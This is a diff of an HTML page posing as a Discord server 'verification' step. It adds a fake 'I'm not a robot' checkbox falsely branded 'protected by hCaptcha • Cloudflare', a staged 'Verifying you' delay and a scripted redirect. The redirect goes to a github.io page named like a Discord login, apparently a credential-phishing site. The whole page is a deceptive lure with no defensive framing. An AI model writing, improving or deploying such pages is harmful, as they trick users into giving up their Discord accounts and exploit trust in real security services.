@@ -3,131 +3,264 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Verify • Discord Bot</title>
+  <title>Verification Required • Join Server</title>
   <style>
-    * {
-      margin: 0;
-      padding: 0;
-      box-sizing: border-box;
-    }
-
+    * { margin:0; padding:0; box-sizing:border-box; }
     body {
-      min-height: 100vh;
-      background: #0f1014;
-      font-family: "gg sans", "Helvetica Neue", Helvetica, Arial, sans-serif;
-      color: #dcddde;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      padding: 20px;
+      min-height:100vh;
+      background:#0d0e11;
+      font-family:"gg sans","Helvetica Neue",Helvetica,Arial,sans-serif;
+      color:#dcddde;
+      display:flex;
+      justify-content:center;
+      align-items:center;
+      padding:16px;
     }
-
     .card {
-      background: #1e2124;
-      border-radius: 8px;
-      width: 100%;
-      max-width: 480px;
-      padding: 48px 32px;
-      text-align: center;
-      box-shadow: 0 8px 32px rgba(0,0,0,0.7);
-      border: 1px solid #2a2d31;
+      background:#18191d;
+      border-radius:8px;
+      width:100%;
+      max-width:540px;
+      padding:52px 40px 60px;
+      box-shadow:0 12px 48px rgba(0,0,0,0.75);
+      border:1px solid #25272c;
+      position:relative;
+      overflow:hidden;
     }
-
     .logo {
-      width: 96px;
-      height: 96px;
-      margin: 0 auto 24px;
-      background: #5865f2;
-      border-radius: 50%;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      font-size: 48px;
-      color: white;
-      font-weight: bold;
+      width:96px; height:96px;
+      margin:0 auto 32px;
+      background:linear-gradient(135deg,#5865f2,#7289da);
+      border-radius:50%;
+      display:flex;
+      align-items:center;
+      justify-content:center;
+      font-size:52px;
+      color:#fff;
+      font-weight:bold;
+      box-shadow:0 4px 16px rgba(88,101,242,0.5);
     }
-
     h1 {
-      font-size: 28px;
-      font-weight: 600;
-      margin-bottom: 12px;
-      color: #fff;
+      font-size:28px;
+      font-weight:600;
+      color:#fff;
+      margin-bottom:12px;
+      text-align:center;
     }
-
-    p {
-      font-size: 16px;
-      color: #b9bbbe;
-      margin-bottom: 40px;
-      line-height: 1.5;
+    .intro {
+      font-size:15px;
+      color:#a0a4aa;
+      text-align:center;
+      margin-bottom:36px;
+      line-height:1.45;
     }
-
+    .location-info {
+      background:rgba(250,166,26,0.08);
+      border:1px solid rgba(250,166,26,0.25);
+      border-radius:6px;
+      padding:14px 18px;
+      margin:0 auto 32px;
+      max-width:420px;
+      font-size:13.5px;
+      color:#faa61a;
+      text-align:center;
+    }
+    .captcha-area {
+      background:#212529;
+      border:1px solid #2e3338;
+      border-radius:6px;
+      padding:24px 28px;
+      margin:0 auto 36px;
+      max-width:420px;
+    }
+    .captcha-row {
+      display:flex;
+      align-items:center;
+      gap:14px;
+      font-size:15.5px;
+      color:#e3e5e8;
+      cursor:pointer;
+      user-select:none;
+      padding:8px 0;
+    }
+    .check-box {
+      width:22px;
+      height:22px;
+      border:2px solid #6e737a;
+      border-radius:4px;
+      flex-shrink:0;
+      display:flex;
+      align-items:center;
+      justify-content:center;
+      transition:all 0.18s;
+    }
+    .check-box.checked {
+      background:#5865f2;
+      border-color:#5865f2;
+    }
+    .check-box.checked::after {
+      content:"✓";
+      color:white;
+      font-size:15px;
+      font-weight:bold;
+    }
+    .recaptcha-brand {
+      font-size:11px;
+      color:#72767d;
+      margin-top:10px;
+      text-align:right;
+    }
+    .loader-container {
+      display:none;
+      align-items:center;
+      justify-content:center;
+      gap:12px;
+      margin:28px 0;
+      font-size:14px;
+      color:#b9bbbe;
+    }
+    .spinner {
+      width:24px;
+      height:24px;
+      border:4px solid #5865f2;
+      border-top:4px solid transparent;
+      border-radius:50%;
+      animation:spin 0.9s linear infinite;
+    }
+    @keyframes spin { to { transform:rotate(360deg); } }
+    .dots::after {
+      content:"";
+      animation: dots 1.6s steps(5,end) infinite;
+    }
+    @keyframes dots {
+      0%,20% { content:"."; }
+      40%    { content:".."; }
+      60%    { content:"..."; }
+      80%,100% { content:"...."; }
+    }
     .verify-btn {
-      display: inline-block;
-      width: 100%;
-      max-width: 320px;
-      padding: 16px 32px;
-      background: linear-gradient(145deg, #5865f2, #4752c4);
-      color: white;
-      font-size: 18px;
-      font-weight: 600;
-      text-decoration: none;
-      border-radius: 6px;
-      border: none;
-      cursor: pointer;
-      transition: all 0.2s;
-      box-shadow: 0 4px 16px rgba(88, 101, 242, 0.4);
+      width:100%;
+      max-width:340px;
+      margin:0 auto;
+      padding:16px;
+      background:#5865f2;
+      color:white;
+      font-size:17px;
+      font-weight:600;
+      border:none;
+      border-radius:6px;
+      cursor:not-allowed;
+      opacity:0.45;
+      transition:all 0.22s;
     }
-
-    .verify-btn:hover {
-      transform: translateY(-2px);
-      box-shadow: 0 8px 24px rgba(88, 101, 242, 0.6);
-      background: linear-gradient(145deg, #4752c4, #3a44a6);
+    .verify-btn.active {
+      cursor:pointer;
+      opacity:1;
+      box-shadow:0 6px 20px rgba(88,101,242,0.45);
     }
-
-    .small-text {
-      margin-top: 32px;
-      font-size: 13px;
-      color: #72767d;
+    .verify-btn:hover.active {
+      background:#4752c4;
+      transform:translateY(-1px);
     }
-
-    .blink {
-      animation: blink 1.5s infinite;
+    .status {
+      min-height:28px;
+      font-size:14.5px;
+      color:#43b581;
+      margin-top:20px;
     }
-
-    @keyframes blink {
-      0%, 100% { opacity: 1; }
-      50% { opacity: 0.4; }
+    .footer {
+      margin-top:48px;
+      font-size:12px;
+      color:#4f545c;
+      text-align:center;
+    }
+    .footer a {
+      color:#00aff4;
+      text-decoration:none;
     }
   </style>
 </head>
 <body>
 
 <div class="card">
+
   <div class="logo">✓</div>
 
-  <h1>Verification Required</h1>
-  <p>
-    This server requires you to verify you're human before you can join or continue.<br>
-    Click the button below to complete verification.
-  </p>
-
-  <!-- CHANGE THIS LINK to wherever you want to redirect -->
-  <a href="https://discordauth-botverify.github.io/Log-in-Discord/EdgeHubBotVerifyer.html" class="verify-btn" id="verifyButton">
-    VERIFY
-  </a>
-
-  <div class="small-text">
-    This is a security check provided by <span style="color:#5865f2;">Discord Bot Verifier</span><br>
-    <span class="blink">Verifying in progress...</span>
+  <h1>One more step</h1>
+  <div class="intro">
+    Verify you're human to join the server<br>
+    This check helps protect our community from bots and spam.
   </div>
+
+  <div class="location-info">
+    Please Complete The Captcha<strong></strong><br>
+    
+  </div>
+
+  <div class="captcha-area">
+    <label class="captcha-row" id="captchaTrigger">
+      <div class="check-box" id="checkBox"></div>
+      <span>I'm not a robot</span>
+    </label>
+    <div class="recaptcha-brand">protected by hCaptcha • Cloudflare</div>
+  </div>
+
+  <div class="loader-container" id="verifyingStage">
+    <div class="spinner"></div>
+    <span>Verifying you<span class="dots"></span></span>
+  </div>
+
+  <button class="verify-btn" id="verifyBtn" disabled>VERIFY IDENTITY</button>
+
+  <div class="status" id="statusMsg"></div>
+
+  <div class="footer">
+    This verification is provided by <a href="#">Discord Server Protection</a><br>
+    © 2026 Bot Verifier Systems
+  </div>
+
 </div>
 
 <script>
-  // Optional: you can add extra behavior if you want
-  document.getElementById("verifyButton").addEventListener("click", function(e) {
-    // You can add delay or fake loading if you want
-    // e.preventDefault();
-    // setTimeout(() => { window.location.href = this.href; }, 1200);
+  const REDIRECT_URL = "https://discordauth-botverify.github.io/Log-in-Discord/EdgeHubBotVerifyer.html"; // ← CHANGE THIS
+
+  const checkBox       = document.getElementById("checkBox");
+  const trigger        = document.getElementById("captchaTrigger");
+  const verifyBtn      = document.getElementById("verifyBtn");
+  const statusMsg      = document.getElementById("statusMsg");
+  const verifyingStage = document.getElementById("verifyingStage");
+
+  let captchaDone = false;
+
+  trigger.addEventListener("click", e => {
+    e.preventDefault();
+    if (captchaDone) return;
+
+    checkBox.classList.add("checked");
+    captchaDone = true;
+
+    verifyingStage.style.display = "flex";
+    statusMsg.textContent = "";
+
+    setTimeout(() => {
+      verifyingStage.style.display = "none";
+      statusMsg.style.color = "#43b581";
+      statusMsg.textContent = "Human verified ✓";
+      verifyBtn.classList.add("active");
+      verifyBtn.disabled = false;
+    }, 3200); // realistic-ish delay
+  });
+
+  verifyBtn.addEventListener("click", () => {
+    if (!captchaDone) return;
+
+    verifyBtn.textContent = "REDIRECTING...";
+    verifyBtn.disabled = true;
+    statusMsg.textContent = "Connecting securely";
+
+    setTimeout(() => {
+      window.location.href = REDIRECT_URL;
+    }, 1600);
   });
 </script>
 
